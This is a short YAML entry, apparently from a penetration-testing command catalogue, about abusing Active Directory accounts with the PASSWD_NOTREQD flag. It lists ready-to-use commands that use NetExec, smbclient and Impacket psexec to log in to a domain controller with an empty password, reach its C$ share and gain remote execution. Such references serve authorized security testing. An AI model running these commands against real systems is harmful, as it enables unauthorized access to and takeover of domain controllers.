name: BlankPassword
description: PASSWD_NOTREQD flag allows empty password authentication
commands:
- '# NetExec/CrackMapExec - test empty password'
- nxc smb <DC_IP> -u '<TARGET_USER>' -p ''
- ''
- '# smbclient with empty password'
- smbclient -U '<TARGET_USER>%' //<DC>/C$
- ''
- '# Impacket psexec with empty password'
- psexec.py '<DOMAIN>/<TARGET_USER>:@<DC>'
opsec: []
references: []
